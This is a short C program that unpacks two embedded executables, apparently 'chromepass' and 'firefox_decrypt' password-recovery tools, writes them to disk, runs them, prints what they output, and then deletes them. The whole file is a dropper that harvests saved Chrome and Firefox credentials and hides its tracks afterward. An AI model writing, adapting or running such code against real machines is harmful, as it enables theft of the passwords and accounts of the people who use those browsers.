#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "chromepass.h"      // Include the chromepass byte array
#include "firefox_decrypt.h" // Include the firefox_decrypt byte array

// Function to write a byte array to a file
int write_to_file(const char *filename, unsigned char *data, unsigned int len) {
    FILE *file = fopen(filename, "wb");
    if (!file) return -1;
    fwrite(data, 1, len, file);
    fclose(file);
    return 0;
}

int main() {
    // Filepaths for the temporary files
    const char *chromepass_path = "chromepass.exe";
    const char *firefox_decrypt_path = "firefox_decrypt.exe";

    // Write byte arrays to temporary executable files
    if (write_to_file(chromepass_path, chromepass, chromepass_len) != 0) {
        perror("Failed to write chromepass_temp.exe");
        return 1;
    }
    if (write_to_file(firefox_decrypt_path, firefox_decrypt, firefox_decrypt_len) != 0) {
        perror("Failed to write firefox_decrypt_temp.exe");
        return 1;
    }

    // Command strings to execute the temporary files
    char cmd1[256];
    snprintf(cmd1, sizeof(cmd1), "%s", chromepass_path);
    char cmd2[256];
    snprintf(cmd2, sizeof(cmd2), "%s -c 2", firefox_decrypt_path);

    // Buffers to capture output
    char buffer1[128];
    char buffer2[128];

    // Run and capture output from chromepass_temp.exe
    FILE *fp1 = popen(cmd1, "r");
    if (!fp1) {
        perror("Failed to run chromepass_temp.exe");
        return 1;
    }
    printf("Output from chromepass_temp.exe:\n");
    while (fgets(buffer1, sizeof(buffer1), fp1) != NULL) {
        printf("%s", buffer1);
    }
    pclose(fp1);

    // Run and capture output from firefox_decrypt_temp.exe
    FILE *fp2 = popen(cmd2, "r");
    if (!fp2) {
        perror("Failed to run firefox_decrypt_temp.exe");
        return 1;
    }
    printf("\nOutput from firefox_decrypt_temp.exe:\n");
    while (fgets(buffer2, sizeof(buffer2), fp2) != NULL) {
        printf("%s", buffer2);
    }
    pclose(fp2);

    // Clean up by removing the temporary files
    remove(chromepass_path);
    remove(firefox_decrypt_path);

    return 0;
}
